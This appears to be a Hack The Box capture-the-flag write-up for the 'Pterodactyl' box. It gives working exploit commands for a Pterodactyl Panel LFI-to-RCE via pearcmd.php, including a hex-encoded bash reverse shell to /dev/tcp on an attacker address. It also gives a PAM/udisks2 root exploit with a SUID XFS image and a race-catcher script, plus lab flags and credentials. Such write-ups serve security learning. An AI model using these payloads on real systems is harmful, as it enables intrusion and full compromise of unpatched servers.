# Pterodactyl -- Writeup
> Hack The Box | Medium | Season 10 | March 2026

## Summary

Pterodactyl is a Medium Linux box running the Pterodactyl game server management panel on openSUSE Leap 15.6. Initial access is achieved through CVE-2025-49132, an unauthenticated LFI in the panel's locale endpoint that chains with PHP PEAR's `pearcmd.php` for RCE. Privilege escalation requires cracking a panel user's bcrypt password hash (which is reused for SSH), then chaining two 2025 vulnerabilities: a PAM session bypass (CVE-2025-6018) that grants `allow_active` polkit privileges, followed by a libblockdev/udisks2 flaw (CVE-2025-6019) that mounts filesystems without the `nosuid` flag during maintenance operations -- allowing execution of a SUID root shell from a crafted XFS image.

## Reconnaissance

Starting with a full TCP scan:

```bash
nmap -p- -sC -sV -T4 --min-rate=1000 10.129.6.130
```

Two open ports:
- **22/tcp** -- OpenSSH 9.6
- **80/tcp** -- nginx 1.21.5, redirecting to `http://pterodactyl.htb/`

After adding `pterodactyl.htb` to `/etc/hosts`, the landing page reveals a Minecraft community site called "MonitorLand" with a server address of `play.pterodactyl.htb`. Two critical information disclosure findings on the main domain:

**phpinfo.php** -- Exposes the full PHP 8.4.8 configuration. Key details: `register_argc_argv=On`, `disable_functions` is empty, `open_basedir` is empty, and the include path contains `/usr/share/php/PEAR`. These are all prerequisites for PEAR-based RCE.

**changelog.txt** -- Reveals exact software versions and architecture decisions:
```
[Installed] Pterodactyl Panel v1.11.10
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.
[Enhanced] PHP Capabilities
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

Testing `panel.pterodactyl.htb` confirms the Pterodactyl Panel is running there -- a Laravel/React SPA with session cookies (`XSRF-TOKEN`, `pterodactyl_session`).

## Foothold -- CVE-2025-49132: Unauthenticated LFI to RCE

CVE-2025-49132 (CVSS 10.0) affects Pterodactyl Panel <= 1.11.10. The `/locales/locale.json` endpoint passes the `locale` and `namespace` GET parameters directly to PHP's `include()` without sanitization or authentication.

### Understanding the Primitive

The vulnerability gives us arbitrary local file inclusion. The `locale` and `namespace` parameters are concatenated into a file path and included. Since PHP `include()` executes any PHP code in the included file, we can chain this with `pearcmd.php` -- a PHP PEAR script that's designed for CLI use but can be triggered via web requests when `register_argc_argv=On`.

The key insight is that when `register_argc_argv` is enabled, PHP populates `$_SERVER['argv']` from the URL query string. PEAR's `pearcmd.php` reads its arguments from `$_SERVER['argv']`, so we can pass PEAR commands through URL parameters.

### Step 1: Validate the LFI

```bash
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=en&namespace=validation"
```

Returns valid JSON -- the endpoint is accessible without authentication.

### Step 2: Extract credentials via LFI

```bash
# Database credentials
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"

# APP_KEY
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app"
```

This yields MariaDB credentials (`pterodactyl:PteraPanel`) and the Laravel APP_KEY.

### Step 3: RCE via pearcmd.php

The PEAR `config-create` command writes a config file to a specified path. We abuse this to write a PHP webshell:

```bash
# Stage 1: Write webshell to /tmp via pearcmd config-create
# The hex '6964' decodes to 'id'
curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin('6964'))?>+/tmp/shell.php"

# Stage 2: Include the webshell
curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=shell"
```

The hex encoding (`system(hex2bin('...'))`) avoids URL encoding issues with shell metacharacters. Any command can be hex-encoded and executed.

### Step 4: Reverse shell

Hex-encode a bash reverse shell and execute through the same mechanism:

```bash
# bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'
PAYLOAD=$(echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.91/9001 0>&1'" | xxd -p | tr -d '\n')
curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin('${PAYLOAD}'))?>+/tmp/rev.php"
curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=rev"
```

Shell as `wwwrun` on the target. User flag is world-readable in `/home/phileasfogg3/user.txt`.

## Privilege Escalation: User (wwwrun to phileasfogg3)

From the wwwrun webshell, we query the Pterodactyl panel database using the extracted credentials:

```bash
mariadb -u pterodactyl -pPteraPanel -h 127.0.0.1 panel \
  -e 'SELECT id,username,email,password FROM users;'
```

Two users with bcrypt hashes:
- `headmonitor` (admin) -- `$2y$10$3WJht3/5GO...`
- `phileasfogg3` -- `$2y$10$PwO0TBZA8hL...`

Cracking with john:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hashes.txt
```

phileasfogg3's hash cracks to `!QAZ2wsx` (a keyboard-walk pattern). This password is reused for SSH:

```bash
ssh phileasfogg3@10.129.6.130
# Password: !QAZ2wsx
```

Checking sudo privileges reveals an unusual configuration:

```
User phileasfogg3 may run the following commands on pterodactyl:
    (ALL) ALL
```

With `Defaults targetpw` set globally -- meaning sudo requires the **target user's** password, not the invoking user's. This blocks direct `sudo su` since we don't know root's password.

## Privilege Escalation: Root (CVE-2025-6018 + CVE-2025-6019)

Root requires chaining two 2025 vulnerabilities discovered by the Qualys Threat Research Unit, specifically targeting SUSE Linux systems.

### CVE-2025-6018: PAM Session Bypass

openSUSE Leap 15's PAM configuration reads `~/.pam_environment` with `user_readenv=1` by default. By injecting environment variables that trick systemd-logind into marking an SSH session as "physically present," we gain `allow_active` polkit privileges:

```bash
cat > ~/.pam_environment << 'EOF'
XDG_SEAT=seat0
XDG_VTNR=1
EOF
```

Log out and back in, then verify:

```bash
loginctl show-session $XDG_SESSION_ID | grep Active
# Active=yes
```

With `Active=yes`, we can now invoke polkit-protected operations (like udisks2 disk management) without a password.

### CVE-2025-6019: libblockdev nosuid Mount Bypass

The libblockdev library (used by udisks2) fails to apply the `nosuid` mount flag during temporary filesystem operations like Check or Resize. The attack:

1. **Create an XFS image containing a SUID root shell.** On a machine where you have root access, create the image with a properly embedded SUID binary:

```bash
# On attack box (where you have root)
dd if=/dev/zero of=exploit.img bs=1M count=400
mkfs.xfs exploit.img
sudo mkdir /tmp/mnt && sudo mount exploit.img /tmp/mnt
sudo cp /bin/bash /tmp/mnt/bash
sudo chown root:root /tmp/mnt/bash
sudo chmod 4755 /tmp/mnt/bash
sudo umount /tmp/mnt
```

Alternatively, if you lack root on an x86_64 machine, you can create the image on the target using `mkfs.xfs`, mount it via `udisksctl mount`, copy bash in, then unmount and use `xfs_db` to set the SUID bit in the inode metadata:

```bash
xfs_db -x exploit.img
> inode 131
> write core.uid 0
> write core.gid 0
> write core.mode 0104755
> quit
```

2. **Transfer the image to the target** and set up a loop device:

```bash
udisksctl loop-setup -f exploit.img
# Returns loop device path, e.g., /dev/loop0
```

3. **Write a race condition catcher** that monitors `/proc/mounts` for the temporary mount:

```python
#!/usr/bin/env python3
import os, time
while True:
    with open('/proc/mounts') as f:
        for line in f:
            if '/tmp/blockdev' in line and 'nosuid' not in line:
                mp = line.split()[1]
                bash = os.path.join(mp, 'bash')
                if os.path.exists(bash):
                    print(f"[!!!] HIT at {mp}")
                    os.execv(bash, [bash, '-p'])
    time.sleep(0.001)
```

4. **Run the catcher in the FOREGROUND** (critical -- if backgrounded, the SUID shell replaces the background process and you never see it):

```bash
# Terminal 1 (FOREGROUND): run catcher
python3 catcher.py

# Terminal 2 (or background with delay): trigger the vulnerable operation
sleep 2 && gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 'a{sv}{}' &
```

When libblockdev temporarily mounts the XFS image for the resize operation, it mounts at `/tmp/blockdev.XXXXX` **without nosuid**. The catcher detects this mount, finds the SUID bash binary, and `execv`s it -- replacing the current process with a root shell:

```
[!!!] HIT at /tmp/blockdev.EOYYL3
bash-4.4# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
bash-4.4# cat /root/root.txt
23a028f57158b735838c675007307f8d
```

## Flags

- **User**: `17b264159068601f09dfbca0685c60ad`
- **Root**: `23a028f57158b735838c675007307f8d`

## Key Takeaways

1. **Information disclosure compounds.** phpinfo.php confirmed every prerequisite for the pearcmd exploit (PEAR path, register_argc_argv, no disable_functions). changelog.txt gave the exact panel version. Together, they turned a "maybe" into a "definitely."

2. **Always check binary versions against CVE databases -- not just configurations.** `sudo -l` showing `(ALL) ALL` with `targetpw` looked like a dead end. Checking `sudo --version` (and RPM changelogs on SUSE) would have immediately pointed toward CVE research. Version-checking privileged binaries should be a standard post-access step alongside `sudo -l`, SUID enumeration, and capabilities checks.

3. **SUSE backports patches without changing upstream version numbers.** `sudo 1.9.15p5` looked vulnerable to CVE-2025-32463, but SUSE had backported the fix into their package build. Always check `rpm -q --changelog` on RPM-based systems rather than trusting the version string alone.

4. **Process management matters in race conditions.** The CVE-2025-6019 exploit worked from the first attempt in terms of mechanism (mount without nosuid, race won, SUID binary found). But running the catcher in the background meant the SUID root bash replaced a background process we couldn't interact with. The catcher must run in the foreground so `os.execv` replaces the process you're watching.

5. **The PAM + udisks2 chain (CVE-2025-6018 + CVE-2025-6019) is high-impact on SUSE systems.** The PAM bypass requires only writing a two-line file to `~/.pam_environment`. Once `Active=yes`, any polkit `allow_active` action becomes available without authentication -- udisks2 is just one example. Look for this on any openSUSE/SLES system.
